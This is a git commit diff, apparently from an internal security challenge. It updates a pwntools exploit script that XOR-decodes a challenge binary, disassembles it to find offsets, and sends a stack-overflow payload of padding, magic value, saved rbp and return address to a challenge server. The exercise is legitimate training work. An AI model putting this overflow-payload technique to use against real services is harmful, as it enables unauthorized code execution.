bfb606b36be3e5cb581755a9335c03c421947347
szhan21 <shunda.zhang@intel.com>
2022-12-11 08:33:24 +0800

    Attacking aegv2...

--- monthly_security_challenge/aegv2/workspace/dec0.py
+++ monthly_security_challenge/aegv2/workspace/dec0.py
@@ -16,32 +16,29 @@ proc = os.popen(cmd)
 buf = proc.read().replace('\n','').replace(' ','')
 proc.close()
 bbuf = bytes.fromhex(buf)
-#bbuf = buf.decode('hex')
-ifname = ''
+
 for i in range(256):
         buf = xor(bbuf, i)
-        if buf.hex()[:8] == 'f30f1efa':
-            with open('bin'+str(i), 'wb') as f:
-                f.write(buf)
-            ifname = str(i)
-            break
+        with open('bin'+str(i), 'wb') as f:
+               f.write(buf)
 
-proc = os.popen('ndisasm -b 64 bin'+ifname)
-buf = proc.read()
+for i in range(256):
+        proc = os.popen('ndisasm -b 64 bin'+str(i))
+        buf = proc.read()
+        proc.close()
+        with open('bin'+str(i)+'.asm', 'w') as f:
+               f.write(buf)
+
+cmd = "grep F30F1EFA *.asm|awk -F: '{print $1}'"
+proc = os.popen(cmd)
+fname = proc.read().replace('\n','')
 proc.close()
-with open('bin'+ifname+'.asm', 'w') as f:
-       f.write(buf)
 
-#cmd = "grep F30F1EFA *.asm|awk -F: '{print $1}'"
-#proc = os.popen(cmd)
-#fname = proc.read().replace('\n','')
-#proc.close()
-fname = 'bin'+ifname+'.asm'
 with open(fname, 'r') as f:
 	lines = f.readlines()
 #print(lines)
 
-#ifname = fname[3:-4]
+ifname = fname[3:-4]
 sf = 0
 x = 0
 for i in range(len(lines)):
@@ -72,25 +69,23 @@ proc = os.popen(cmd)
 buf = proc.read().split('\n')
 buflen = int(buf[4].split('\t')[2].split()[1].split(',')[0][1:],16)
 magic = p32(int(buf[5].split('\t')[2].split()[1].split(',')[0][1:],16))
-rbp = p64(0x7fffffffff80)
+rbp = p64(0x7fffffffdf80)
 shellcode = b'A'*(buflen-4)+magic+rbp+addr
-#shellcode = 'A'*(buflen-4)+magic+rbp+addr
+
+print(shellcode)
 
 #cmd = "chmod +x bin_2"
 #os.system(cmd)
+
 #io = process('./bin_2')
+#io = remote('10.102.60.248',1180)
+io = remote('127.0.0.1', 5000)
 
-io = remote('10.102.60.248',1180)
-
-io.recvuntil(' hmmm.....')
+io.recvuntil('hmmm')
 io.sendline(ifname)
 io.sendline(str(x))
+shellcode = b'\x61\x66\x1b\x7f\x11\x40\x00\x00'
 io.sendline(shellcode)
-print(magic)
-print(rbp)
-print(addr)
-print(shellcode)
-print(io.recvline())
 print(io.recvline())
 print(io.recvline())
 print(io.recvline())
